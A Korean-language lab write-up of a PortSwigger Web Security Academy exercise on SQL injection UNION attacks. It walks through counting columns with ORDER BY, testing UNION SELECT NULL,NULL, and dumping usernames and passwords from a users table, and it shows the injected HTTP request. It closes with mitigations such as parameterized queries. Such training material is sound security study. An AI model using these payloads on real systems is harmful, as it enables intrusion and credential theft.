# Lab: SQL injection UNION attack, retrieving data from other tables
**SQL Injection / UNION 공격 · Practitioner**

## TL;DR
카테고리 필터의 sqli를 통해 union select로 products 쿼리에 users 테이블을 합쳐 관리자의 아이디 비번을 습득해 로그인함.

## 취약점
category 파라미터가 쿼리에 직접 삽입됨. union을 이용해 category파라미터를 users같은 테이블과 함께 묶어서 민감한 정보 출력 가능(권한 밖의 정보를 상품인것마냥 출력)

## 익스플로잇
1. 카테고리에 있는 아무 항목을 누르고, 요청을 리피터로 보낸다.
2. ' order by n--로 칼럼의 수를 파악한다. (숫자를 늘리다가 에러가 나면 그 이전 숫자가 칼럼의 수)
3. ' union select null,null--으로 union이 성립하는것을 확인한다. 두 컬럼이 모두 출력됨
4. null자리를 미리 제공받은 username과 password로 바꾸고(테이블 명 모를때에는 information_schema를 이용해서 캐내야한다.), 뒤에 from users를 붙인다. (' union select username, password from users--)
5. 유저들의 DB가 출력되는것을 확인하고 관리자 계정으로 로그인하면 끝

## 핵심 요청
```http
GET /filter?category=Corporate+gifts%27+UNION+SELECT+username,+password+FROM+users-- HTTP/2
Host: .web-security-academy.net
```

## 영향
union으로 임의 테이블 데이터를 끌어와서 출력 가능하다. 계정 정보가 모두 출력되어 관리자의 아이디 비번 또한 습득 가능

## 대응
파라미터화 쿼리 사용
사용자 입력을 쿼리에 직접 연결 금지
DB계정 최소 권한, 비번은 평문화 금지
